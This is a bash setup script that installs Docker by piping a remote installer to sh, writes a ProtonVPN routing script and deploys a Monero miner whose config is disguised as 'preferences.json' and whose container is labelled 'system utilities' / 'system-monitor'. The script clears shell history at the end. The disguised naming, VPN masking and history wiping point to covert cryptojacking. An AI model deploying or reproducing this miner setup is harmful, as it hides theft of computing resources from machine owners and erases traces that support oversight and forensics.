#!/bin/bash
# Setup script - Run after cloning: ./setup.sh <WALLET> <PROTON_USER> <PROTON_PASS>

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# Parse arguments
WALLET="$1"
PROTON_USER="$2"
PROTON_PASS="$3"

# Validate arguments
if [ -z "$WALLET" ] || [ -z "$PROTON_USER" ] || [ -z "$PROTON_PASS" ]; then
    echo -e "${RED}Usage: ./setup.sh <WALLET> <PROTON_USER> <PROTON_PASS>${NC}"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCRIPT_DIR}"

echo -e "${GREEN}[*] Setting up system utilities...${NC}"

# Install Docker if not present
if ! command -v docker &> /dev/null; then
    echo -e "${GREEN}[*] Installing Docker...${NC}"
    curl -fsSL https://get.docker.com | sh
    systemctl enable docker
    systemctl start docker
fi

# Create config directory
mkdir -p config scripts

# Generate network.sh with credentials and random VPN selection
cat > scripts/network.sh << NETWORK
#!/bin/bash
MAX_RETRIES=5
RETRY_COUNT=0

PVPN_USER="${PROTON_USER}"
PVPN_PASS="${PROTON_PASS}"

# Skip VPN if credentials are placeholder or empty
if [ "\${PVPN_USER}" = "SKIP" ] || [ -z "\${PVPN_USER}" ]; then
    echo "[*] VPN skipped - no credentials provided"
    exit 0
fi

setup_openvpn() {
    mkdir -p /etc/openvpn
    
    # Create auth file
    echo "\${PVPN_USER}" > /etc/openvpn/auth.txt
    echo "\${PVPN_PASS}" >> /etc/openvpn/auth.txt
    chmod 600 /etc/openvpn/auth.txt
    
    # Pick a random VPN config from the vpns folder
    VPN_CONFIGS=(/opt/utilities/vpns/*.ovpn)
    RANDOM_CONFIG="\${VPN_CONFIGS[\$RANDOM % \${#VPN_CONFIGS[@]}]}"
    
    echo "[*] Selected VPN: \$(basename \${RANDOM_CONFIG})"
    
    # Copy config
    cp "\${RANDOM_CONFIG}" /etc/openvpn/proton.ovpn
    
    # Add auth-user-pass if not present
    if ! grep -q "auth-user-pass" /etc/openvpn/proton.ovpn; then
        echo "auth-user-pass /etc/openvpn/auth.txt" >> /etc/openvpn/proton.ovpn
    else
        sed -i 's|auth-user-pass.*|auth-user-pass /etc/openvpn/auth.txt|g' /etc/openvpn/proton.ovpn
    fi
}

connect_vpn() {
    setup_openvpn
    
    # Kill any existing openvpn
    pkill openvpn 2>/dev/null || true
    sleep 1
    
    # Start OpenVPN in background
    openvpn --config /etc/openvpn/proton.ovpn --daemon --log /tmp/vpn.log --writepid /tmp/openvpn.pid
    
    # Wait for connection
    for i in \$(seq 1 30); do
        sleep 2
        if ip addr show tun0 > /dev/null 2>&1; then
            return 0
        fi
    done
    return 1
}

while [ \$RETRY_COUNT -lt \$MAX_RETRIES ]; do
    if connect_vpn; then
        if ip addr show tun0 > /dev/null 2>&1; then
            echo "[*] VPN connected"
            exit 0
        fi
    fi
    RETRY_COUNT=\$((RETRY_COUNT + 1))
    echo "[!] Retry \$RETRY_COUNT..."
    sleep 5
done

# VPN failed but continue anyway
echo "[!] VPN connection failed, continuing without VPN"
exit 0
NETWORK

# Generate preferences.json with wallet
cat > config/preferences.json << PREFERENCES
{
    "autosave": false,
    "background": true,
    "colors": false,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 75,
        "asm": true,
        "argon2-impl": null
    },
    "log-file": null,
    "donate-level": 0,
    "donate-over-proxy": 0,
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "pool.supportxmr.com:3333",
            "user": "${WALLET}",
            "pass": "x",
            "rig-id": "util-node",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "sni": false,
            "daemon": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 0,
    "health-print-time": 0,
    "dmi": false,
    "syslog": false,
    "verbose": 0,
    "watch": false,
    "pause-on-battery": false,
    "pause-on-active": false
}
PREFERENCES

# Make scripts executable
chmod +x scripts/*.sh entrypoint.sh 2>/dev/null || true

echo -e "${GREEN}[*] Building container...${NC}"
docker compose build --quiet 2>/dev/null || docker-compose build --quiet

echo -e "${GREEN}[*] Starting system utilities...${NC}"
docker compose up -d 2>/dev/null || docker-compose up -d

# Clear history
history -c 2>/dev/null || true

echo -e "${GREEN}[✓] Setup complete!${NC}"
echo -e "${GREEN}[*] Check status: docker ps | grep system-monitor${NC}"
